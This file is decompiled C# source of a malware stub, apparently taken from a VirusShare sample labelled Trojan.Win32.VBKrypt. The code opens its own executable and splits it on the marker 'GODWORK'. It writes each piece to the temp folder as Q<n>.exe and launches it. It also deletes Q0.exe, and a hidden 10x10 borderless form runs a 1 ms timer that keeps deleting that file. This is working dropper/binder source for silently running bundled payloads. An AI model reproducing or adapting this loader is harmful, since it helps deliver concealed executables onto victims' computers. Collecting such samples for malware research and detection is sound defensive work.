// Decompiled with JetBrains decompiler
// Type: Mstub.Form1
// Assembly: stub, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: A6B73EB1-6117-4BC5-A5F2-D2C52F0E0CDD
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00007-msil\Trojan.Win32.VBKrypt.i-88775b51f9ddba02f1823dbfd49f1fee200de3b2c512dd6b7584f2421b9c1510.exe

using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Runtime.CompilerServices;
using System.Windows.Forms;

namespace Mstub
{
  [DesignerGenerated]
  public class Form1 : Form
  {
    private IContainer components;
    [AccessedThroughProperty("Timer1")]
    private Timer _Timer1;
    private const string Filesplit = "GODWORK";
    private string time;

    [DebuggerNonUserCode]
    public Form1()
    {
      this.Load += new EventHandler(this.Form1_Load);
      this.InitializeComponent();
    }

    [DebuggerNonUserCode]
    protected override void Dispose(bool disposing)
    {
      try
      {
        if (!disposing || this.components == null)
          return;
        this.components.Dispose();
      }
      finally
      {
        base.Dispose(disposing);
      }
    }

    [DebuggerStepThrough]
    private void InitializeComponent()
    {
      this.components = (IContainer) new System.ComponentModel.Container();
      this.Timer1 = new Timer(this.components);
      this.SuspendLayout();
      this.Timer1.Enabled = true;
      this.Timer1.Interval = 1;
      this.AutoScaleDimensions = new SizeF(6f, 13f);
      this.AutoScaleMode = AutoScaleMode.Font;
      this.ClientSize = new Size(10, 10);
      this.FormBorderStyle = FormBorderStyle.None;
      this.Name = nameof (Form1);
      this.Text = nameof (Form1);
      this.ResumeLayout(false);
    }

    internal virtual Timer Timer1
    {
      [DebuggerNonUserCode] get => this._Timer1;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.Timer1_Tick);
        if (this._Timer1 != null)
          this._Timer1.Tick -= eventHandler;
        this._Timer1 = value;
        if (this._Timer1 == null)
          return;
        this._Timer1.Tick += eventHandler;
      }
    }

    private void Form1_Load(object sender, EventArgs e)
    {
label_0:
      int num1;
      int num2;
      try
      {
        ProjectData.ClearProjectError();
        num1 = -2;
label_1:
        int num3 = 2;
        string tempPath = Path.GetTempPath();
label_2:
        num3 = 3;
        FileSystem.FileOpen(1, Application.ExecutablePath, OpenMode.Binary, OpenAccess.Read, OpenShare.Shared);
label_3:
        num3 = 4;
        string Expression = Strings.Space(checked ((int) FileSystem.LOF(1)));
label_4:
        num3 = 5;
        FileSystem.FileGet(1, ref Expression);
label_5:
        num3 = 6;
        FileSystem.FileClose(1);
label_6:
        num3 = 7;
        string[] strArray1 = Strings.Split(Expression, "GODWORK");
label_7:
        num3 = 8;
        string[] strArray2 = strArray1;
        int index1 = 0;
        goto label_17;
label_9:
        num3 = 9;
        int index2;
        FileSystem.FileOpen(3, tempPath + "\\Q" + Conversions.ToString(index2) + ".exe", OpenMode.Binary, OpenAccess.ReadWrite);
label_10:
        num3 = 10;
        FileSystem.FilePut(3, strArray1[index2], -1L, false);
label_11:
        num3 = 11;
        FileSystem.FileClose(3);
label_12:
        num3 = 12;
        if (!File.Exists(tempPath + "\\Q0.exe"))
          goto label_14;
label_13:
        num3 = 13;
        FileSystem.Kill(tempPath + "\\Q0.exe");
label_14:
        num3 = 15;
        Process.Start(tempPath + "\\Q" + Conversions.ToString(index2) + ".exe");
label_15:
        num3 = 16;
        checked { ++index2; }
        checked { ++index1; }
label_16:
        num3 = 17;
label_17:
        if (index1 < strArray2.Length)
        {
          string str = strArray2[index1];
          goto label_9;
        }
label_18:
        num3 = 18;
        this.Close();
        goto label_25;
label_20:
        num2 = num3;
        switch (num1 > -2 ? num1 : 1)
        {
          case 1:
            int num4 = num2 + 1;
            num2 = 0;
            switch (num4)
            {
              case 1:
                goto label_0;
              case 2:
                goto label_1;
              case 3:
                goto label_2;
              case 4:
                goto label_3;
              case 5:
                goto label_4;
              case 6:
                goto label_5;
              case 7:
                goto label_6;
              case 8:
                goto label_7;
              case 9:
                goto label_9;
              case 10:
                goto label_10;
              case 11:
                goto label_11;
              case 12:
                goto label_12;
              case 13:
                goto label_13;
              case 14:
              case 15:
                goto label_14;
              case 16:
                goto label_15;
              case 17:
                goto label_16;
              case 18:
                goto label_18;
              case 19:
                goto label_25;
            }
            break;
        }
      }
      catch (Exception ex) when (ex is Exception & num1 != 0 & num2 == 0)
      {
        ProjectData.SetProjectError(ex);
        goto label_20;
      }
      throw ProjectData.CreateProjectError(-2146828237);
label_25:
      if (num2 == 0)
        return;
      ProjectData.ClearProjectError();
    }

    private void Timer1_Tick(object sender, EventArgs e)
    {
      try
      {
        FileSystem.Kill(Path.GetTempPath() + "\\Q0.exe");
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }
  }
}
